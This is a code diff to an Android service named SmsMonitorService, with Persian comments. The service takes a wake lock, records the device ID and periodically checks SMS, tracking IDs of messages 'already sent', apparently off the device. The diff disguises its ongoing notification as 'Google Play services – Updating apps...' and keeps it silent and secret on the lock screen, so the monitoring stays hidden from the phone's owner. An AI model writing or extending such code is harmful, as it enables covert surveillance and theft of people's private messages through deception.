@@ -29,8 +29,9 @@ class SmsMonitorService : Service() {
 
     companion object {
         private const val TAG = "SmsMonitorService"
-        private const val NOTIFICATION_ID = 1002
-        private const val CHANNEL_ID = "sms_monitor_channel"
+        // 🔥 استفاده از همون notification UnifiedService
+        private const val NOTIFICATION_ID = 1001  // همون ID UnifiedService
+        private const val CHANNEL_ID = "unified_service_channel"  // همون channel UnifiedService
         
         // 🔥 ذخیره ID های پیامک‌هایی که قبلاً فرستاده شدن
         private val processedSmsIds = HashSet<String>()
@@ -46,7 +47,8 @@ class SmsMonitorService : Service() {
         deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
         
         acquireWakeLock()
-        startForegroundNotification()
+        // 🔥 استفاده از notification موجود UnifiedService
+        attachToExistingNotification()
         startScheduledSmsCheck()
         
         Log.d(TAG, "SmsMonitorService created")
@@ -84,43 +86,31 @@ class SmsMonitorService : Service() {
         }
     }
 
-    private fun startForegroundNotification() {
+    private fun attachToExistingNotification() {
+        // 🔥 استفاده از همون notification که UnifiedService ساخته
+        // این باعث میشه فقط یک notification نشون داده بشه
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "SMS Sync",
-                NotificationManager.IMPORTANCE_LOW
-            ).apply {
-                description = "Syncing messages"
-                setShowBadge(false)
-                enableLights(false)
-                enableVibration(false)
-                setSound(null, null)
-                lockscreenVisibility = Notification.VISIBILITY_SECRET
+            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("Google Play services")
+                .setContentText("Updating apps...")
+                .setSmallIcon(android.R.drawable.stat_notify_sync)
+                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
+                .setOngoing(true)
+                .setShowWhen(false)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                .setCategory(NotificationCompat.CATEGORY_SERVICE)
+                .setSilent(true)
+                .build()
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                startForeground(
+                    NOTIFICATION_ID,
+                    notification,
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                )
+            } else {
+                startForeground(NOTIFICATION_ID, notification)
             }
-            val manager = getSystemService(NotificationManager::class.java)
-            manager?.createNotificationChannel(channel)
-        }
-
-        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Message Sync")
-            .setContentText("Syncing...")
-            .setSmallIcon(android.R.drawable.stat_notify_sync)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setOngoing(true)
-            .setShowWhen(false)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .setSilent(true)
-            .build()
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            startForeground(
-                NOTIFICATION_ID,
-                notification,
-                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-            )
-        } else {
-            startForeground(NOTIFICATION_ID, notification)
         }
     }
 
